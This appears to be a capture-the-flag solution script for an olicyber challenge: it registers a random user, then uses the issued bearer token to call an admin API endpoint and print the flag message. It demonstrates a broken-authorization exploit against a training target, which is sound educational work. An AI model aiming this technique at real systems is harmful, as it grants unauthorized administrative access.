#!/usr/bin/env python3
import requests, os

URL = 'https://single-page-admin.challs.olicyber.it'

r = requests.post(URL + '/api/register', json={'username': os.urandom(20).hex()})
token = r.json()['token']
r = requests.post(URL + '/api/admin', headers={'Authorization': f'Bearer {token}'})
print(r.json()['message'])